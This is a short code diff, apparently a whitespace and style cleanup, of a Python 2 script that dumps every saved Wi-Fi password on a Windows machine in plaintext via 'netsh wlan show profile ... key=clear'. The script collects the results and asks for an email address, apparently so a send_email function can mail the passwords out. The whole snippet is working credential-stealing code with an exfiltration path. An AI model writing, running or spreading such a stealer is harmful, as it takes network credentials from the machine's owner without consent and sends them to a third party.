@@ -20,23 +20,25 @@ def send_email(email_add, password, message):
 
 
 def check_wireless(x):
-    if x  == "There is no wireless interface on the system.":
+    if x == "There is no wireless interface on the system.":
         print("There is no wireless connection")
         call("exit", shell=True)
         return False
     return True
 
+
 def all_passwords(names_network):
     result = ""
-    for i in range((len(names_network)/2)):
-         command = 'netsh wlan show profile name="{}" key=clear'.format(names_network[i])
-         result += check_output(command, shell=True)
+    for i in range((len(names_network) / 2)):
+        command = 'netsh wlan show profile name="{}" key=clear'.format(names_network[i])
+        result += check_output(command, shell=True)
     return result
+
 
 command = 'netsh wlan show profile'
 wifi_networks = check_output(command, shell=True)
 wifi_networks = wifi_networks.rstrip()
-if check_wireless(wifi_networks) :
+if check_wireless(wifi_networks):
     names_network = re.findall("(?:Profile\s*:\s)(.*)", wifi_networks)
     passwords = all_passwords(names_network)
     email = raw_input("Please enter your email: ")
